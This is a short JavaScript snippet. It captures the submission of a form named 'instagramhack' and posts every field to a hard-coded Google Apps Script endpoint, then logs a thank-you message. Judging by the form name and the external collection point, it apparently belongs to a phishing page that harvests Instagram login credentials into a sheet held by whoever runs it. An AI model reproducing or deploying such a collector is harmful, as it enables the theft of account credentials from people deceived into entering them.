

const scriptURL =
  "https://script.google.com/macros/s/AKfycbwSOTAHP5oWjlI0U01ciVgOIK18GP0dkf30LiMlGIbIjOu2zxOMV4fkbW1IjpVJD3oBRQ/exec";
const form = document.forms["instagramhack"];

form.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(scriptURL, { method: "POST", body: new FormData(form) })
    .then((response) =>
      console.log("Thank you! your form is submitted successfully.")
    )
    .catch((error) => console.error("Error!", error.message));
});



